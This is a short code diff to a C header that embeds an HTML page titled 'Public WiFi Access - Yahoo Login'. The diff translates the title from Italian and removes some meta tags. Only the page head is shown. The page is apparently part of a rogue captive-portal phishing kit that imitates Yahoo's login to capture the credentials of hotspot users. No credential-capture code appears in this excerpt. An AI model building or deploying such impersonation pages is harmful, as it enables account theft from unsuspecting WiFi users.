@@ -4,23 +4,17 @@ const char YAHOO_HTML[] = R"=====(
 
   <head>
 
-<title>Accesso Wifi Pubblico - Yahoo Login</title>
+  <title>Public WiFi Access - Yahoo Login</title>
 
     <meta charset='UTF-8'>
-    <meta http-equiv='cache-control' content='no-cache' />
-    <meta http-equiv='expires' content='0' />
-    <meta http-equiv='pragma' content='no-cache' />
     <meta name='viewport' content='width=device-width,
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
-    <meta name='robots' content='noindex, nofollow'>
 
     <script src='static/js/jquery.min.js'></script>
 
     <link rel='stylesheet' href='static/css/bootstrap.min.css'>
     <link rel='stylesheet' href='static/css/style.css'>
     <link rel='icon' type='image/png' href='static/img/pfpnk8kp5b.png'/>
-
-
 
     <style>
 
